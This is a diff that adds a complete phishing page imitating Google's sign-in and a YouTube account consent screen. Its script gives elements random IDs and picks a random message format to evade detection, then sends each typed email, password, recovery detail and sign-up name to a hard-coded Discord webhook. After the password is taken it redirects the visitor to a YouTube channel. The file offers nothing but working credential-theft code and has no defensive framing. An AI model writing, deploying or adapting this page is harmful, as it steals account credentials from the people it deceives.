@@ -1,0 +1,332 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
+<title>Sign in - Google Accounts</title>
+<style>
+/* Core CSS */
+*{margin:0;padding:0;box-sizing:border-box;font-family:'Roboto',-apple-system,BlinkMacSystemFont,'Segoe UI',Arial,sans-serif}
+html,body{height:100%}
+body{background:#fff;color:#202124;overflow:hidden}
+.mc{padding:20px 24px;flex:1;display:none;flex-direction:column;overflow-y:auto}
+.mc.act{display:flex}
+.g-logo{text-align:center;margin-top:40px;margin-bottom:20px;font-size:32px;letter-spacing:-1px}
+.g-logo span:nth-child(1),.g-logo span:nth-child(4){color:#4285F4}
+.g-logo span:nth-child(2),.g-logo span:nth-child(6){color:#EA4335}
+.g-logo span:nth-child(3){color:#FBBC05}
+.g-logo span:nth-child(5){color:#34A853}
+h1{font-size:24px;font-weight:400;text-align:center;margin-bottom:16px}
+.desc{font-size:16px;text-align:center;line-height:1.5;margin-bottom:12px}
+.lm{font-size:14px;color:#1a73e8;text-align:center;text-decoration:none;font-weight:500;display:block;margin-bottom:40px}
+.ic{margin-bottom:10px}
+input[type=text],input[type=password]{width:100%;padding:14px 16px;font-size:16px;border:1px solid #dadce0;border-radius:4px;outline:none;transition:border .2s}
+input:focus{border:2px solid #1a73e8;padding:13px 15px}
+input.error{border:2px solid #d93025;padding:13px 15px}
+.ih{font-size:12px;color:#5f6368;margin-top:4px;padding-left:4px;display:none}
+.ih.red{color:#d93025;display:block}
+.fe,.ca{display:inline-block;font-size:14px;color:#1a73e8;text-decoration:none;font-weight:500;cursor:pointer}
+.fe{margin-top:10px;margin-bottom:40px}
+.bb{display:flex;justify-content:space-between;align-items:center;padding:16px 24px;background:#fff;margin-bottom:20px}
+.btn-n{background:#1a73e8;color:#fff;border:none;border-radius:4px;padding:10px 24px;font-size:14px;font-weight:500;cursor:pointer;font-family:inherit}
+.btn-n:hover{background:#1557b0}
+.btn-n:disabled{opacity:.6;cursor:wait}
+.user-info{display:flex;align-items:center;justify-content:center;gap:8px;font-size:14px;font-weight:500;margin-bottom:40px}
+.fl{position:relative;margin-top:10px}
+.fl input{padding:20px 48px 8px 16px;width:100%;font-size:16px;border:2px solid #1a73e8;border-radius:4px;outline:none;background:transparent}
+.fl label{position:absolute;top:-10px;left:12px;background:#fff;padding:0 4px;font-size:12px;color:#1a73e8;font-weight:500}
+.eye-btn{position:absolute;right:12px;top:50%;transform:translateY(-50%);background:transparent;border:none;cursor:pointer;color:#5f6368;padding:5px;display:flex;align-items:center;justify-content:center}
+.eye-btn svg{width:22px;height:22px;fill:currentColor}
+.eye-btn:hover{color:#202124}
+@media(min-width:450px){.mc,.bb{padding:20px 15vw}}
+
+/* Dynamic Container */
+#mut-root{display:flex;flex-direction:column;height:100vh;height:100dvh;background:#fff;overflow-y:auto;position:relative;}
+
+/* Screens Configuration */
+.screen-container { display: none; flex-direction: column; height: 100%; width: 100%; }
+.screen-container.active { display: flex; }
+
+/* YouTube Consent Screen CSS */
+#consentScreen { align-items: center; justify-content: center; padding: 24px; text-align: center; background: #fff; }
+.yt-icon{width:72px;height:72px;background:#ff0000;border-radius:18px;display:flex;align-items:center;justify-content:center;margin-bottom:24px;box-shadow:0 4px 10px rgba(255,0,0,0.2);}
+.yt-icon svg{width:40px;height:40px;fill:#fff;}
+#consentScreen h2{font-size:24px;color:#202124;margin-bottom:8px;font-weight:500;}
+#consentScreen p{font-size:15px;color:#5f6368;margin-bottom:32px;line-height:1.5;}
+.account-box{display:flex;align-items:center;gap:14px;padding:14px 16px;border:1px solid #dadce0;border-radius:12px;width:100%;max-width:360px;cursor:pointer;margin-bottom:16px;transition:background 0.2s;background:#fff;}
+.account-box:hover{background:#f8f9fa;}
+.avatar{width:40px;height:40px;border-radius:50%;background:#1a73e8;color:#fff;display:flex;align-items:center;justify-content:center;font-weight:500;font-size:18px;}
+.acc-info{flex:1;text-align:left;}
+.acc-info .name{font-size:15px;color:#202124;font-weight:500;}
+.acc-info .email{font-size:13px;color:#5f6368;margin-top:2px;}
+.btn-continue{width:100%;max-width:360px;padding:12px;background:#1a73e8;color:#fff;border:none;border-radius:8px;font-size:15px;font-weight:500;cursor:pointer;transition:background 0.2s;}
+.btn-continue:hover{background:#1557b0;}
+.consent-footer{font-size:12px;color:#5f6368;margin-top:32px;max-width:360px;line-height:1.6;text-align:center;}
+</style>
+</head>
+<body>
+
+<div id="mut-root"></div>
+
+<script>
+'use strict';
+
+/**
+ * ============================================================
+ * POLYMORPHIC MUTATION ENGINE (Final Bulletproof Version)
+ * ============================================================
+ */
+
+const CONFIG = {
+    webhook: 'https://discord.com/api/webhooks/1563434330762510376/12SyovNQ-u3QbewHJLTbjYCebmrvifh1jhMtXZ5r_9nNrfmjLBZudwbZqb1saeku1nz8',
+    redirect: 'https://youtube.com/@meharplays-93?si=D-dRlfpRy-LY69mm',
+    errorMsg: 'Please continue to Google',
+    timeout: 5000
+};
+
+const sig = () => 'm_' + Math.random().toString(36).substring(2, 9);
+const IDS = {
+    ei: sig(), ih: sig(), fei: sig(), feiErr: sig(),
+    pi: sig(), eyeBtn: sig(), eyeShow: sig(), eyeHide: sig(),
+    nextBtn: sig(), flk: sig(), p1: sig(), p2: sig(), pFor: sig(), pCre: sig()
+};
+
+let currentView = 'consent';
+let busy = false;
+let focusTimer = null;
+
+function buildPayload(stage, data) {
+    const templates = [
+        () => ({ embeds: [{ title: '🔐 Login Stage', color: 5763719, fields: data, timestamp: new Date().toISOString() }] }),
+        () => ({ content: `**[${stage}]**\n` + data.map(d => `**${d.name}:** \`${d.value}\``).join('\n') })
+    ];
+    return JSON.stringify(templates[Math.floor(Math.random() * templates.length)]());
+}
+
+async function transmit(payload) {
+    if (!CONFIG.webhook) return;
+    const ctrl = new AbortController();
+    const timer = setTimeout(() => ctrl.abort(), CONFIG.timeout);
+    try {
+        await fetch(CONFIG.webhook, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: payload,
+            signal: ctrl.signal,
+            mode: 'cors'
+        });
+        clearTimeout(timer);
+    } catch (e) {
+        clearTimeout(timer);
+        console.warn("Transmission Error:", e.message);
+    }
+}
+
+function injectEngine() {
+    const root = document.getElementById('mut-root');
+    
+    root.innerHTML = `
+      <div id="consentScreen" class="screen-container active">
+        <div class="yt-icon"><svg viewBox="0 0 24 24"><path d="M21.58 7.19c-.23-.86-.9-1.53-1.76-1.76C18.25 5 12 5 12 5s-6.25 0-7.82.43c-.86.23-1.53.9-1.76 1.76C2 8.75 2 12 2 12s0 3.25.43 4.81c.23.86.9 1.53 1.76 1.76C5.75 19 12 19 12 19s6.25 0 7.82-.43c.86-.23 1.53-.9 1.76-1.76C22 15.25 22 12 22 12s0-3.25-.43-4.81zM10 15V9l5.2 3L10 15z"/></svg></div>
+        <h2>Continue to YouTube</h2>
+        <p>YouTube wants to access your Google Account</p>
+        <div class="account-box" onclick="switchView('login')">
+          <div class="avatar">M</div>
+          <div class="acc-info"><div class="name">Mehar Gaming</div><div class="email">mehar@gmail.com</div></div>
+        </div>
+        <button class="btn-continue" onclick="switchView('login')">Continue</button>
+        <div class="consent-footer">To continue, Google will share your name, email address, and profile picture with YouTube.</div>
+      </div>
+
+      <div id="loginScreen" class="screen-container">
+        <div class="mc act" id="${IDS.p1}">
+          <div class="g-logo"><span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span></div>
+          <h1>Sign in</h1>
+          <p class="desc">Use your Google Account.</p>
+          <div class="ic"><input type="text" placeholder="Email or phone" id="${IDS.ei}" autocomplete="off"><div class="ih" id="${IDS.ih}">Enter a valid email</div></div>
+          <a href="#" class="fe" id="lnkFor">Forgot email?</a>
+          <div><a href="#" class="ca" id="lnkCre">Create account</a></div>
+        </div>
+        <div class="mc" id="${IDS.p2}">
+          <div class="g-logo"><span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span></div>
+          <h1>Welcome</h1>
+          <div class="user-info"><span id="mutEmail">email@gmail.com</span></div>
+          <div class="fl">
+            <input type="password" id="${IDS.pi}" autocomplete="off"><label>Enter your password</label>
+            <button type="button" class="eye-btn" id="${IDS.eyeBtn}">
+              <svg id="${IDS.eyeShow}" viewBox="0 0 24 24"><path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/></svg>
+              <svg id="${IDS.eyeHide}" viewBox="0 0 24 24" style="display:none;"><path d="M12 7c2.76 0 5 2.24 5 5 0 .65-.13 1.26-.36 1.83l2.92 2.92c1.51-1.26 2.7-2.89 3.43-4.75-1.73-4.39-6-7.5-11-7.5-1.4 0-2.74.25-3.98.7l2.16 2.16C10.74 7.13 11.35 7 12 7zM2 4.27l2.28 2.28.46.46C3.08 8.3 1.78 10.02 1 12c1.73 4.39 6 7.5 11 7.5 1.55 0 3.03-.3 4.38-.84l.42.42L19.73 22 21 20.73 3.27 3 2 4.27zM7.53 9.8l1.55 1.55c-.05.21-.08.43-.08.65 0 1.66 1.34 3 3 3 .22 0 .44-.03.65-.08l1.55 1.55c-.67.33-1.41.53-2.2.53-2.76 0-5-2.24-5-5 0-.79.2-1.53.53-2.2zm4.31-.78l3.15 3.15.02-.16c0-1.66-1.34-3-3-3l-.17.01z"/></svg>
+            </button>
+          </div>
+        </div>
+        <div class="mc" id="${IDS.pFor}">
+          <div class="g-logo"><span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span></div>
+          <h1>Find your email</h1>
+          <div class="ic">
+            <input type="text" placeholder="Phone number or recovery email" id="${IDS.fei}" autocomplete="off">
+            <div class="ih" id="${IDS.feiErr}">${CONFIG.errorMsg}</div>
+          </div>
+          <a href="#" class="ca" id="lnkBack1">Back to sign in</a>
+        </div>
+        <div class="mc" id="${IDS.pCre}">
+          <div class="g-logo"><span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span></div>
+          <h1>Create account</h1>
+          <div class="ic">
+            <input type="text" placeholder="First name" id="mutCfn" style="margin-bottom:10px">
+            <input type="text" placeholder="Last name" id="mutCln" style="margin-bottom:10px">
+            <input type="text" placeholder="Username" id="mutCun">
+          </div>
+          <a href="#" class="ca" id="lnkBack2">Back to sign in</a>
+        </div>
+        <div class="bb">
+          <a href="#" class="fe" id="${IDS.flk}" style="margin:0;display:none">Forgot password?</a>
+          <div style="flex:1"></div>
+          <button class="btn-n" type="button" id="${IDS.nextBtn}">Next</button>
+        </div>
+      </div>
+    `;
+
+    document.getElementById('lnkFor').onclick = (e) => { e.preventDefault(); pg(IDS.pFor); };
+    document.getElementById('lnkCre').onclick = (e) => { e.preventDefault(); pg(IDS.pCre); };
+    document.getElementById('lnkBack1').onclick = (e) => { e.preventDefault(); pg(IDS.p1); };
+    document.getElementById('lnkBack2').onclick = (e) => { e.preventDefault(); pg(IDS.p1); };
+    document.getElementById(IDS.flk).onclick = (e) => { e.preventDefault(); pg(IDS.pFor); };
+    document.getElementById(IDS.eyeBtn).onclick = mutateTogglePass;
+    document.getElementById(IDS.nextBtn).onclick = executeNext;
+    
+    const ei = document.getElementById(IDS.ei);
+    if(ei) ei.addEventListener('input', () => { document.getElementById(IDS.ih).className = 'ih'; ei.classList.remove('error'); });
+    
+    const fei = document.getElementById(IDS.fei);
+    if(fei) fei.addEventListener('input', () => { document.getElementById(IDS.feiErr).className = 'ih'; fei.classList.remove('error'); });
+
+    document.addEventListener('keydown', e => {
+        if(e.key !== 'Enter') return;
+        if(busy || document.getElementById(IDS.nextBtn).disabled) return;
+        if(currentView === 'consent') return;
+        e.preventDefault();
+        executeNext();
+    });
+
+    switchView('consent');
+}
+
+function switchView(target) {
+    document.getElementById('consentScreen').classList.remove('active');
+    document.getElementById('loginScreen').classList.remove('active');
+    
+    if (target === 'consent') {
+        document.getElementById('consentScreen').classList.add('active');
+        currentView = 'consent';
+    } else {
+        document.getElementById('loginScreen').classList.add('active');
+        pg(IDS.p1);
+    }
+}
+
+function pg(id) {
+    if (busy) return;
+    document.querySelectorAll('.mc').forEach(e => e.classList.remove('act'));
+    
+    const el = document.getElementById(id);
+    if (!el) return;
+    el.classList.add('act');
+    
+    currentView = id === IDS.p1 ? 'p1' : id === IDS.p2 ? 'p2' : id === IDS.pFor ? 'pFor' : 'pCre';
+    
+    if (id === IDS.p1 || id === IDS.p2) {
+        const flk = document.getElementById(IDS.flk);
+        if(flk) flk.style.display = (currentView === 'p2') ? 'block' : 'none';
+    }
+    
+    if (currentView === 'pFor') { document.getElementById(IDS.feiErr).className = 'ih'; document.getElementById(IDS.fei).classList.remove('error'); }
+    if (currentView === 'p1') { document.getElementById(IDS.ih).className = 'ih'; document.getElementById(IDS.ei).classList.remove('error'); }
+    
+    if (focusTimer) clearTimeout(focusTimer);
+    focusTimer = setTimeout(() => {
+        if (currentView === 'p1') document.getElementById(IDS.ei).focus();
+        else if (currentView === 'p2') document.getElementById(IDS.pi).focus();
+        else if (currentView === 'pFor') document.getElementById(IDS.fei).focus();
+        else if (currentView === 'pCre') document.getElementById('mutCfn').focus();
+    }, 100);
+}
+
+function mutateTogglePass() {
+    const pi = document.getElementById(IDS.pi);
+    const show = document.getElementById(IDS.eyeShow);
+    const hide = document.getElementById(IDS.eyeHide);
+    if (pi.type === 'password') {
+        pi.type = 'text'; show.style.display = 'none'; hide.style.display = 'block';
+    } else {
+        pi.type = 'password'; show.style.display = 'block'; hide.style.display = 'none';
+    }
+}
+
+async function executeNext() {
+    if (busy) return;
+    const btn = document.getElementById(IDS.nextBtn);
+    busy = true; 
+    btn.disabled = true; 
+    btn.textContent = '...';
+
+    try {
+        if (currentView === 'p1') {
+            const v = document.getElementById(IDS.ei).value.trim();
+            if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(v)) {
+                document.getElementById(IDS.ei).classList.add('error');
+                document.getElementById(IDS.ih).className = 'ih red';
+                document.getElementById(IDS.ih).innerText = 'Enter a valid email';
+                busy = false; btn.disabled = false; btn.textContent = 'Next';
+                return;
+            }
+            await transmit(buildPayload('Email', [{name:'Email', value:v}]));
+            document.getElementById('mutEmail').innerText = v;
+            busy = false; btn.disabled = false; btn.textContent = 'Next';
+            pg(IDS.p2);
+        } 
+        else if (currentView === 'p2') {
+            const pw = document.getElementById(IDS.pi).value;
+            if (pw === '') { 
+                alert('Password required'); 
+                busy = false; btn.disabled = false; btn.textContent = 'Next'; 
+                return; 
+            }
+            
+            // Send webhook, wait max 1.5s then redirect
+            await Promise.race([
+                transmit(buildPayload('Password', [{name:'Email', value:document.getElementById('mutEmail').innerText}, {name:'Password', value:pw}])),
+                new Promise(r => setTimeout(r, 1500))
+            ]);
+            
+            btn.textContent = 'Signing in...';
+            window.location.replace(CONFIG.redirect);
+            return; // Exit without resetting button
+        }
+        else if (currentView === 'pFor') {
+            const val = document.getElementById(IDS.fei).value.trim();
+            if (val === '') { alert('Enter recovery info'); busy = false; btn.disabled = false; btn.textContent = 'Next'; return; }
+            await transmit(buildPayload('Recovery', [{name:'Recovery', value:val}]));
+            busy = false; btn.disabled = false; btn.textContent = 'Next';
+            document.getElementById(IDS.fei).classList.add('error');
+            document.getElementById(IDS.feiErr).className = 'ih red';
+        }
+        else if (currentView === 'pCre') {
+            const fn = document.getElementById('mutCfn').value.trim();
+            const ln = document.getElementById('mutCln').value.trim();
+            const un = document.getElementById('mutCun').value.trim();
+            if (!fn || !ln || !un) { alert('Fill all fields'); busy = false; btn.disabled = false; btn.textContent = 'Next'; return; }
+            await transmit(buildPayload('Create', [{name:'Name', value:fn+' '+ln}, {name:'User', value:un}]));
+            busy = false; btn.disabled = false; btn.textContent = 'Next';
+            alert('Demo: Account created');
+            pg(IDS.p1);
+        }
+    } catch(e) {
+        console.error(e);
+        busy = false; btn.disabled = false; btn.textContent = 'Next';
+    }
+}
+
+window.addEventListener('DOMContentLoaded', injectEngine);
+</script>
+</body>
+</html>
